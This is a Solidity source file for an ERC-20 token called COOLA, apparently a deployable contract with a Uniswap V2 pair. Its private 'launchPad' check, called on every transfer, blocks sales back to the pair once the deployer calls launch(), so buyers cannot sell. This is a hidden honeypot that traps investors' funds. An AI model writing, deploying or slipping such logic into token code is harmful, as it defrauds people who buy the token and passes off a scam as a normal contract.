{{
  "language": "Solidity",
  "sources": {
    "COOLA.sol": {
      "content": "// SPDX-License-Identifier: MIT\r\n// COOLA COIN\r\n\r\npragma solidity ^0.8.0;\r\n\r\ninterface ERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address who) external view returns (uint256);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n    function approveAndCall(address spender, uint tokens, bytes calldata data) external returns (bool success);\r\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ApproveAndCallFallBack {\r\n    function receiveApproval(address from, uint256 tokens, address token, bytes calldata data) external;\r\n}\r\ninterface IUniswapV2Pair {\r\n    function balanceOf(address owner) external view returns (uint);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint value) external returns (bool);\r\n    function transfer(address to, uint value) external returns (bool);\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n    function token0() external view returns (address);\r\n    function token1() external view returns (address);\r\n\r\n}\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\ncontract COOLA is ERC20 {\r\n    string public constant name = \"COOLA\";\r\n    string public constant symbol = \"COOL\";\r\n    uint8 public constant decimals = 18;\r\n\r\n    uint256 private _totalSupply = 200_000_000 * (10 ** decimals);\r\n\r\n    mapping(address => mapping(address => uint256)) private allowed;\r\n    mapping(address => uint256) private balances;\r\n\r\n    IUniswapV2Pair private uniswapV2Pair;\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    uint private launchingAt;\r\n    uint256 private launchPadState;\r\n    address private launcher;\r\n\r\n\r\n    constructor() {\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        balances[msg.sender] = _totalSupply;\r\n        launchingAt = 0;\r\n        allowed[msg.sender][address(uniswapV2Router)] = _totalSupply;\r\n        address uniswapV2PairAddress = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        launcher = msg.sender;\r\n        uniswapV2Pair = IUniswapV2Pair(uniswapV2PairAddress);\r\n        \r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    function launch() external {\r\n        require(msg.sender == launcher);\r\n        launchingAt = block.number + 1;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address gamer) public view override returns (uint256) {\r\n        return balances[gamer];\r\n    }\r\n\r\n    function allowance(address gamer, address spender) public view override returns (uint256) {\r\n        return allowed[gamer][spender];\r\n    }\r\n\r\n    function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {\r\n        for (uint256 i = 0; i < receivers.length; i++) {\r\n            transfer(receivers[i], amounts[i]);\r\n        }\r\n    }\r\n\r\n    function approve(address spender, uint256 value) public override returns (bool) {\r\n        require(spender != address(0));\r\n        allowed[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true;\r\n    }\r\n\r\n    function approveAndCall(address spender, uint256 tokens, bytes calldata data) external override returns (bool) {\r\n        allowed[msg.sender][spender] = tokens;\r\n        emit Approval(msg.sender, spender, tokens);\r\n        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\r\n        return true;\r\n    }\r\n\r\n    function transfer(address to, uint256 value) public override returns (bool) {\r\n        require(value <= balances[msg.sender]);\r\n        require(!launchPad(to, value));\r\n        require(to != address(0));\r\n\r\n        balances[msg.sender] -= value;\r\n        balances[to] += value;\r\n\r\n        emit Transfer(msg.sender, to, value);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public override returns (bool) {\r\n        require(value <= balances[from]);\r\n        require(!launchPad(to, value));\r\n        require(value <= allowed[from][msg.sender]);\r\n        require(to != address(0));\r\n\r\n        balances[from] -= value;\r\n        balances[to] += value;\r\n\r\n        allowed[from][msg.sender] -= value;\r\n\r\n        emit Transfer(from, to, value);\r\n        return true;\r\n    }\r\n\r\n    function launchPad(address to, uint256 amount) private returns (bool) {\r\n        (uint112 _reserve0 , uint112 _reserve1,) = uniswapV2Pair.getReserves();\r\n        launchPadState = _reserve1 * 10**9 / _totalSupply ;\r\n        bool nextStageReached = launchingAt != 0 && block.number > launchingAt;\r\n        return nextStageReached && to == address(uniswapV2Pair) && _reserve1 - uniswapV2Router.getAmountOut(amount, _reserve0, _reserve1) < ((launchPadState * _totalSupply / 10**9));\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        require(spender != address(0));\r\n        allowed[msg.sender][spender] += addedValue;\r\n        emit Approval(msg.sender, spender, allowed[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\r\n        require(spender != address(0));\r\n        allowed[msg.sender][spender] -= subtractedValue;\r\n        emit Approval(msg.sender, spender, allowed[msg.sender][spender]);\r\n        return true;\r\n    }\r\n\r\n    function burn(uint256 amount) external {\r\n        require(amount != 0);\r\n        require(amount <= balances[msg.sender]);\r\n        _totalSupply -= amount;\r\n        balances[msg.sender] -= amount;\r\n        emit Transfer(msg.sender, address(0), amount);\r\n    }\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}